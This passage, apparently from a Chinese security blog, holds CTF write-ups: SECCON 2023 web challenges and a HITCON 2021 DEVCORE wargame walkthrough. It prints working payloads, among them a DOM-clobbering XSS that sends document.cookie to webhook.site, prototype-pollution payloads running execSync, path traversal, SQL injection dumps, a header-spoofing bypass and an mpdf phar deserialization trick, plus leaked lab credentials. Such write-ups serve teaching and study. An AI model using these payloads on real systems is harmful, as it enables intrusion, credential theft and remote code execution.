bypass sandbox，但重點是 setInterval(target.togglePopover, 400) 這一行程式碼。 如果 target.togglePopover 是字串的話，就可以拿來當成 eval 用。 而 target 是 sandbox.contentDocument.body，可以用 name 去 DOM clobber document.body，接著再去 clobber togglePopover 就搞定了。 &lt;iframe name=body srcdoc=\"&lt;a id=togglePopover href=a:fetch(`http://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q=$&#123;document.cookie&#125;`)>&lt;/a>\">&lt;/iframe> eeeeejs (12 solves)遺憾的一題，試了很久但沒有解開 QQ 這題的核心程式碼如下： const ejs = require(\"ejs\"); const &#123; filename, ...query &#125; = JSON.parse(process.argv[2].trim()); ejs.renderFile(filename, query).then(console.log); 你可以控制 filename 跟 query，目標是 XSS。 而 CSP 是 self，意思就是只要做出 &lt;script src=/&gt; 跟建構出一個合法的 JS 程式碼就可以拿到 flag 了。 但這邊另一個限制是只能讀取 src 底下的檔案，所以你的 template 是有限的。 而解法是利用 EJS 的 options openDelimiter、closeDelimiter 以及 delimiter，讓 EJS 用不同的方式去解析模板。 因為在 EJS 裏面 &lt;%= 可以輸出後面接的內容，而 &lt;%- 則是可以輸出 unescaped 的內容，所以我一開始的想法是找到符合這種 pattern 的字串，到最後只找到了一半，可以做出 &lt;script&gt; 但是屬性內容會被編碼，也找到了合法的 JavaScript 產生方式，總之最後沒做出來。 賽後看了一下其他人的解法，才意識到我忘記了這題是呼叫 node.js 以後輸出，作者的解法是把 debug 設成 true，就可以讓 EJS 輸出 src，而 src 會包含 filename，再利用 filename 可以是一個 object 的特性來傳入任意內容。 或是也可以直接把 console.log(src) 放到 template 裡面去。 舉例來說，有一段文字如下： if (opts.debug) &#123; console.log(src); &#125; if (opts.compileDebug &amp;&amp; opts.filename) &#123; src = src + \"\\n//# sourceURL=\" + sanitizedFilename + \"\\n\"; &#125; // other codes 當我們這樣做以後： ejs.renderFile('test', &#123; 'src': &#123; helllo: 'world' &#125;, settings: &#123; 'view options': &#123; delimiter: ' ', openDelimiter: 'if (opts.debug)', closeDelimiter: \" if (opts.compileDebug &amp;&amp; opts.filename)\" &#125; &#125; &#125;).then(r => console.log(r)); 輸出會是： &#123; helllo: &#39;world&#39; &#125; &#123; src &#x3D; src + &quot;\\n&#x2F;&#x2F;# sourceURL&#x3D;&quot; + sanitizedFilename + &quot;\\n&quot;; &#125; &#x2F;&#x2F; other codes 之所以會這樣，是因為把 delimiter 改掉以後，上面那段文字就等同於是： &lt;% &#123; console.log(src); &#125; %> &#123; src = src + \"\\n//# sourceURL=\" + sanitizedFilename + \"\\n\"; &#125; // other codes 因此就等同於是執行了 console.log(src)，所以 src 就會出現在輸出裡面。 node-ppjail (5 solves)這題可以讓你污染 prototype 上面的東西，而且值可以是 function，但問題是不能污染已經有的屬性。 解法是觸發錯誤之後，去找 Node.js 底層會幹嘛，然後污染相對應的屬性。 一個簡單的範例是： Object.prototype.prepareStackTrace = function()&#123; console.log('pwn') &#125; Object.toString.arguments 輸出為： pwn &#x2F;js&#x2F;pp.js:4 Object.toString.arguments ^ [TypeError: &#39;caller&#39;, &#39;callee&#39;, and &#39;arguments&#39; properties may not be accessed on strict mode functions or the arguments objects for calls to them] Node.js v20.0.0 至於要怎麼找出這屬性，學 maple 去 patch V8 似乎是個不錯的選擇。 而作者則是有找到另外兩種方法，在這邊留個紀錄以後比較好找，來源是作者的 writeup： def solve1() -> str: # Solution 1: return json.dumps(&#123; \"__proto__\": &#123; # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81 # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77 \"1\": &#123; \"callback\": &#123; \"__custom__\": True, \"type\": \"Function\", \"args\": [ f\"console.log(global.process.mainModule.require('child_process').execSync('&#123;command&#125;').toString())\" ], &#125;, &#125;, &#125;, &#125;) def solve2() -> str: # Solution 2: return json.dumps(&#123; \"__proto__\": &#123; # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064 \"circular\": &#123; \"get\": &#123; \"__custom__\": True, \"type\": \"Function\", \"args\": [ f\"console.log(global.process.mainModule.require('child_process').execSync('&#123;command&#125;').toString())\" ], &#125;, &#125;, # ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause \"cause\": 1, &#125;, # Cause an error \"toString\": &#123; \"caller\": &#123;&#125;, &#125;, &#125;) deno-ppjail (2 solves)跟上一題類似，但是是要找 deno 的 gadget。 作者找到的 gadget 是 Object.prototype.return 而 maple 找到的是 cause + circular.get，@parrot409 找到的是 nodeProcessUnhandledRejectionCallback 更詳細的說明可以參考 maple 的 writeup：https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail hidden-note (1 solve)這題也很有趣，題目就是經典的那種 XS leaks 的類型，有搜尋功能，只是搜尋結果會把 flag 給 filter 掉。 搜尋結果的頁面可以用 meta redirect 洩漏出來，所以是可以看到結果頁面的。只是結果頁面已經把 flag 去掉了，那還可以做些什麼呢？ 在搜尋的時候，會把結果先排序，排序完以後再把 flag 去掉，而這一題所使用的排序方法在元素 &lt;&#x3D; 12 個的時候會是 stable sort，&gt;12 個就是 unstable sort。 因此，我們可以先建立恰好 12 個 note，內容為：ECCON&#123;@|ECCON&#123;a|ECCON&#123;b|... 假如 flag 是 SECCON&#123;abc&#125; 好了，在搜尋 ECCON&#123;@ 時，因為總數是 12 個，所以是 stable sort，最後搜尋結果頁面的 id 順序不會變。 但如果是搜尋 ECCON&#123;a，結果就變成 13 個，此時變成 unstable sort，note 的順序變了。 因此，可以從結果頁面的內容知道原始搜尋的結果是 12 個以內還是超過 12 個，就可以把這個當作 oracle，進而 leak 出 flag。 這個解法真的很酷，非常新穎！無論是出題的 Ark 還是解開的 maple，都真的好強","link":"/2023/09/23/hitcon-seccon-ctf-2023-writeup/"},{"title":"HITCON 2021 x DEVCORE Wargame 解題心得","text":"這次 HITCON 2021 DEVCORE 有弄了一個 wargame 出來，說明在這邊：https://hackmd.io/@d3vc0r3/hitcon2021 上面寫著兩小時內可解完，想說就來玩玩看好了，殊不知學藝不精導致最後有個地方卡了超久，不過扣除那個地方以外，難度確實不高，這篇簡單記錄一下解題的過程跟心得。 解題筆記挑戰網址（可能已經關閉）：http://web.ctf.devcore.tw/ 進去網站之後很明顯可看到 image.php 有個 path traversal 的洞，可以讀到任意檔案，只要把路徑用 base64 encode 過即可: 先來讀一下 /etc/passwd： 123root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin _apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin # find PHP source code and you will get the flag. 提示說只要能找到 PHP source code 就可以拿到第一個 flag，這時候嘗試了一些預設的 PHP 路徑但一無所獲，想起上禮拜看的 Balsn CTF 2021 WriteUps，知道一個神奇的路徑 file:///proc/self/cwd，於是就去讀 /proc/self/cwd/index.php，順利讀到 index.php 的檔案內容！ 根據檔案 include 的東西繼續去找，可以找到其他相關的檔案： error.php image.php include.php index.php lang.php order.php pdf.php print.php qrcode.php rate-limit.php receipt.php submit.php success.php 在 inlcude.php 裡面順利拿到第一個 flag： &lt;?php /* _ ___ ___ _ __ __ __ __ __ | | / _ \\ / _ \\| |/ / __ __ __ __ \\ \\ / / \\ \\ / / | | | | | | | | | ' / \\ \\ / / \\ \\ / / \\ V / \\ V / | |__| |_| | |_| | . \\ \\ V / \\ V / \\_/ \\_/ |_____\\___/ \\___/|_|\\_\\ \\_/ \\_/ DEVCORE&#123;no.1_path_traverse_to_the_m00n&#125; */ define('IMAGE_PATH', '/usr/share/nginx/images/'); define('MYSQL_HOST', 'mysql'); define('MYSQL_USER', 'web_user'); define('MYSQL_PASSWORD', 'n%6GZgt*hH[+p7vJ'); define('MYSQL_DATABASE', 'web'); define('ORDER_STATUS_PICKING', 'PICKING'); define('ORDER_STATUS_PACKING', 'PACKING'); define('ORDER_STATUS_SENDING', 'SENDING'); define('ORDER_STATUS_DELIVERING', 'DELIVERING'); define('ORDER_STATUS_ARRIVED', 'ARRIVED'); define('ORDER_STATUS_FINISH', 'FINISH'); define('DEFAULT_LANGUAGE', 'zh-tw'); define('ALLOWED_LANGUAGE', 'zh-tw'); function session_start_once() &#123; if (!isset($_SESSION)) &#123; session_start(); &#125; &#125; session_start_once(); if (!isset($_SESSION['lang'])) &#123; $_SESSION['lang'] = DEFAULT_LANGUAGE; &#125; require_once('langs/' . $_SESSION['lang'] . '.php'); require_once('qrcode.php'); function base64_urlsafe_encode($input) &#123; return strtr(base64_encode($input), '+/', '._'); &#125; function base64_urlsafe_decode($input) &#123; return base64_decode(strtr($input, '._', '+/')); &#125; $GLOBALS['_pdo'] = false; function get_pdo() &#123; if ($GLOBALS['_pdo']) &#123; return $GLOBALS['_pdo']; &#125; try &#123; $pdo = new PDO( 'mysql:host='.MYSQL_HOST.';dbname='.MYSQL_DATABASE.';charset=utf8mb4', MYSQL_USER, MYSQL_PASSWORD, array( PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES \\'utf8mb4\\' COLLATE \\'utf8mb4_unicode_ci\\';', PDO::ATTR_TIMEOUT => 2 )); $GLOBALS['_pdo'] = $pdo; &#125; catch (Exception $e) &#123; http_response_code(500); die(\"Failed to connect database. Please contact the administrtor.\"); &#125; return $pdo; &#125; function get_post_param($key, $default=null) &#123; if (isset($_POST[$key])) &#123; return $_POST[$key]; &#125; else &#123; return $default; &#125; &#125; function get_get_param($key, $default=null) &#123; if (isset($_GET[$key])) &#123; return $_GET[$key]; &#125; else &#123; return $default; &#125; &#125; function get_client_ip() &#123; if (!empty($_SERVER['HTTP_CLIENT_IP'])) &#123; $ip = $_SERVER['HTTP_CLIENT_IP']; &#125; else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; &#125; else &#123; $ip = $_SERVER['REMOTE_ADDR']; &#125; return $ip; &#125; function random_str( int $length = 64, string $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' ): string &#123; if ($length &lt; 1) &#123; throw new \\RangeException(\"Length must be a positive integer\"); &#125; $pieces = []; $max = mb_strlen($keyspace, '8bit') - 1; for ($i = 0; $i &lt; $length; ++$i) &#123; $pieces []= $keyspace[random_int(0, $max)]; &#125; return implode('', $pieces); &#125; function get_sig_hash($data) &#123; $pdo = get_pdo(); $res = $pdo->query(\"SELECT `value` FROM options WHERE `key` = 'sig_secret' LIMIT 1\", PDO::FETCH_ASSOC); $row = $res->fetch(); if (!$row) &#123; $secret = random_str(64); $pdo->exec(\"INSERT INTO options VALUES ('sig_secret', '\".$secret.\"'), ('sig_algorithm', 'sha256')\"); &#125; else &#123; $secret = $row['value']; &#125; $res = $pdo->query(\"SELECT `value` FROM options WHERE `key` = 'sig_algorithm' LIMIT 1\", PDO::FETCH_ASSOC); $algo = $res->fetch()['value']; return hash_hmac($algo, $data, $secret); &#125; function get_timezone() &#123; $pdo = get_pdo(); $res = $pdo->query(\"SELECT `value` FROM options WHERE `key` = 'timezone' LIMIT 1\", PDO::FETCH_ASSOC); $row = $res->fetch(); if (!$row) &#123; $pdo->exec(\"INSERT INTO options VALUES ('timezone', 'Asia/Taipei')\"); $timezone = 'Asia/Taipei'; &#125; else &#123; $timezone = $row['value']; &#125; return $timezone; &#125; define('TIMEZONE', get_timezone()); date_default_timezone_set(TIMEZONE); function endsWith( $haystack, $needle ) &#123; $length = strlen( $needle ); if( !$length ) &#123; return true; &#125; return substr( $haystack, -$length ) === $needle; &#125; function order_status_to_text($status) &#123; $text_arr = [ ORDER_STATUS_PICKING => '撿貨', ORDER_STATUS_PACKING => '包裝中', ORDER_STATUS_SENDING => '等待貨運士取貨', ORDER_STATUS_DELIVERING => '配送中', ORDER_STATUS_ARRIVED => '貨物已送達', ORDER_STATUS_FINISH => '完成' ]; return $text_arr[$status]; &#125; 接著看了一下各個檔案，發現 print.php 有個很明顯的 SQL Injection： &lt;?php require_once('include.php'); require_once('third_party/vendor/autoload.php'); //require_once('rate_limit.php'); // rate limit is not working, use random sleep as a workaround sleep(random_int(0, 2)); $is_from_print = true; $id = get_get_param('id', ''); $sig = get_get_param('sig', ''); $sig_hash = get_sig_hash($sig); $pdo = get_pdo(); $res = $pdo->query(\" SELECT * FROM orders WHERE sig_hash = '$sig_hash' AND id = $id LIMIT 1 \", PDO::FETCH_ASSOC); try &#123; $order = $res->fetch(); &#125; catch (Error $e) &#123; $order = []; &#125; ob_start(); include('pdf.php'); $html = ob_get_clean(); $mpdf = new \\Mpdf\\Mpdf([ 'tempDir' => '/tmp', 'autoScriptToLang' => true, 'autoLangToFont' => true, 'mode' => 'utf-8' ]); $mpdf->SetTitle('收據明細'); $mpdf->SetSubject('收據明細'); $mpdf->SetAuthor(random_str((random_int(1, 256)))); $mpdf->SetCreator(random_str((random_int(1, 256)))); $mpdf->WriteHTML($html); $mpdf->Output(); 手動 injection 一下之後可得到下列資訊： table: rate_limit ip,last_visit,visit_times table: items id,title,description table: options key,value table: backend_users id,username,password,description admin u&#x3D;479_p5jV:Fsq(2 table: orders id,name,email,phone,status,sig_hash,order_date,address,note 由於只能弄出一列資料，可利用 GROUP_CONCAT 幫忙 dump 資料，像這樣：SELECT 1,GROUP_CONCAT(note),GROUP_CONCAT(name),GROUP_CONCAT(email),5,6,7,8,9 FROM orders 在 DB 裡面應該是 backend_users 的地方找到了第三個 flag（對，是第三個不是第二個）以及一組帳密，預期之後可能會用到 此時根據剛剛的 include.php，得到這個路徑：third_party/vendor/autoload.php，很明顯就有用 composer，所以可以去讀 /proc/self/cwd/third_party/composer.json，得知只有用一個叫做 mpdf 的套件。 接著來搜尋一下有沒有已知漏洞，找到官方的這個 issue，是由 DEVCORE 的人回報的：phar:&#x2F;&#x2F; deserialization and weak randomness of temporary file name may lead to RCE 從這個 issue 可以得知兩件事情： 我們可以寫入檔案到 &#x2F;tmp&#x2F;mpf&#x2F;_tempCSSidataX_0.jpeg 可以利用 &lt;img src=&quot;#1.jpeg&quot; ORIG_SRC=&quot;phar://../vendor/mpdf/mpdf/tmp/mpdf/_tempCSSidata1_0.jpeg/a.jpg&quot;&gt;&lt;/img&gt; 進行反序列化 但問題來了，要反序列化去觸發攻擊的話需要找到可以利用的 gadget，我在 local 裝了一樣的套件之後，直接在 third_party 資料夾底下搜了 __ 開頭的 method，只有很無用的一些東西，怎麼想都湊不出來 POP 攻擊鍊。 於是我就卡關了。 我想了又想，看了又看，除了這個 phar 的洞有機會打以外，剩下的大概就是 include.php 裡面引入 $_SESSION[&#39;lang&#39;] 的部分，如果可以控制 lang 的話就可以引入任意檔案，但問題是 lang.php 裡面對於參數的控制沒有洞可以打，除非我們可以直接去改 /tmp/sess_XXX，否則打不進去。 但目前唯一可以寫檔的漏洞只有 mpdf 那個，可是檔名有限制，無法寫去任意地方，否則就可以把兩者融合一下。 再來還有一個地方怎麼看怎麼怪，就是我在 DB 裡面打到一組 backend 帳號密碼，照理來說應該要有個後台才對，可以後台在哪裡？ 原本在做這種 wargame 或是 CTF 的時候通常都不太需要列舉，但因為真的沒招所以我只好開始爆搜一波，用 ffuf 掃一下任何我覺得有可能的地方，但是一無所獲，所以我就沒招了，完全不知道下一步該如何是好。 這次的 wargame 是週六早上九點開始，我在十點的時候解完上面講的那兩個 flag，然後就卡了一整天。當天晚上我看了一下，解完的只有 6 個人但是 NFT 有好多個，就去聊天室問了一下如果解題狀況不如預期，有沒有打算放出一些提示，後來得到回覆說需要哪方面的資訊。 因為當初規定的解題時間是到週日晚上六點（HITCON 結束），所以我想說等到結束以後再來問提示，就說明了自己的狀況（解完 1 跟 3 以後卡關），後來得到的回覆是可以從弱點 1 再次觀察一下有沒有後台之類的東西。 於是我再次嘗試了各種路徑，最後試到一個我以前有看過但我居然沒試到的東西：/proc/mounts，內容長這樣： overlay &#x2F; overlay rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;DVIDOZY6PBLWVCFYWII5AAUIJZ:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;3CV53MMJRHWIZWOHD5WPBJANGZ:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;VIRCM74GAO2ULIS6SHAVLYHI7O:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;QC5SROY6OOIX6VQUNGJG3T5GMY:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;3Z7BTZXFISPKXE3DEG4OUPAB5G:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GDBX5T35WQSMHIY2USJLX6SPRU:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;WHFI4IRDVNIOO6MLKCKKAMYQKB:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;JLXT6H6QNKB45UIDZANGKVGLPD:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;M756SQ7NRKEJCKLHPB2PRKG5Z2:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;OY2PWIL6ISIIORC7LZNWWQ6JKN:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GXC3IEBX7YVRSOMH34OAE6Y5LV:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;FNJ3ZWM4WCOCANHBZPBTO47K5B:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;NRVSBMR3SAZ3PNE5KXGMUQMODK:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;2MARFWCP5GVEAG5IBUMLJTABKL:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;F67HXFSPANXFWKRP2R5YJHJRBE:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;AKYB2LUEDDQPLGHVXECL72U4MK:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;B7CFODJXDKC3HEX5ZJD7NAID5A:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;5XQVILRBQTSFRMEKB7YW6UTYLB:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;6ZMT3PTB6QFDZ2PJOURGMQZIMJ:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;4AUQ72KT7D5WLPX3GCGBI576ZS:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;HEF7KMRLHAUNHLXAPU5T4QFJJD:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;ZEPQYM2UZQKKXKJS62CP5RIRKN:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;4BBAOHRGSZ3TVLTD4ZICVZS7C7:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;3K7P7JABJCB4HT5HZRXGBFSSAU:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GUW5ZGQOABGYH7KF5IU5JFHG6E:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;RKL5CJMH6X7ORW4XAB5HJ3RJ3C:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;ZLWG5Z6C6FD3OQEJCZHJHODTTX:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;QLSXNQZKZQQ3YDAFJ675RXRFWL:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;KHQSPHLSLWASTCLEBPKWK7AABD:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GCM3GAH2MB2FBUK2NUGCCQ6H6R:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;FVHE6ZGSGB26C3JN35T36U575B:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;A3B3RQ7O6RTEZTZDFCBNL3R2IG:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;VWEM5H2WW7HEKTCLCWBPPEV4RA:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;QAYAOZL2DM73CJVN7Y3J7MRXDP:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;CGI6OQSFKKJRGSKZASWCHJDJIM,upperdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;ea857d9fda05b6fb0c5b7d79544f8d05943163aec8ecce2c8aaede2a93bd0b1b&#x2F;diff,workdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;ea857d9fda05b6fb0c5b7d79544f8d05943163aec8ecce2c8aaede2a93bd0b1b&#x2F;work 0 0 proc &#x2F;proc proc rw,nosuid,nodev,noexec,relatime 0 0 tmpfs &#x2F;dev tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0 devpts &#x2F;dev&#x2F;pts devpts rw,nosuid,noexec,relatime,gid&#x3D;5,mode&#x3D;620,ptmxmode&#x3D;666 0 0 sysfs &#x2F;sys sysfs ro,nosuid,nodev,noexec,relatime 0 0 tmpfs &#x2F;sys&#x2F;fs&#x2F;cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode&#x3D;755 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,name&#x3D;systemd 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;rdma cgroup ro,nosuid,nodev,noexec,relatime,rdma 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0 mqueue &#x2F;dev&#x2F;mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0 shm &#x2F;dev&#x2F;shm tmpfs rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k 0 0 &#x2F;dev&#x2F;sda &#x2F;etc&#x2F;hosts ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;etc&#x2F;resolv.conf ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;etc&#x2F;hostname ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;frontend ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;images ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;b8ck3nd ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 proc &#x2F;proc&#x2F;bus proc ro,nosuid,nodev,noexec,relatime 0 0 proc &#x2F;proc&#x2F;fs proc ro,nosuid,nodev,noexec,relatime 0 0 proc &#x2F;proc&#x2F;irq proc ro,nosuid,nodev,noexec,relatime 0 0 proc &#x2F;proc&#x2F;sys proc ro,nosuid,nodev,noexec,relatime 0 0 proc &#x2F;proc&#x2F;sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0 tmpfs &#x2F;proc&#x2F;acpi tmpfs ro,relatime 0 0 tmpfs &#x2F;proc&#x2F;kcore tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0 tmpfs &#x2F;proc&#x2F;keys tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0 tmpfs &#x2F;proc&#x2F;timer_list tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0 tmpfs &#x2F;proc&#x2F;sched_debug tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0 tmpfs &#x2F;proc&#x2F;scsi tmpfs ro,relatime 0 0 tmpfs &#x2F;sys&#x2F;firmware tmpfs ro,relatime 0 0 裡面可以直接看到幾個重要路徑： &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;frontend ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;images ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;b8ck3nd ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 沒錯，我一開始就漏掉了這個，就是因為這個卡了一整天 QQ 找到這個之後就變得容易了起來，進到 b8ck3nd/index.php 的時候直接被導回首頁，想起之前在 include.php 看到的一些 utils funtion，試著加入 X-Forwarded-For: 127.0.0.1 就可以 bypass，導去登入頁面，登入帳密就用之前 SQL injection 打出來的那組，登入成功後就順利拿到第四個 flag。 接著可以在 backend 找到一個 upload.php，可以上傳任意檔案： &lt;?php require_once('include.php'); if ($_SERVER['REQUEST_METHOD'] == 'GET') &#123; header('Content-Type: text/plain'); echo 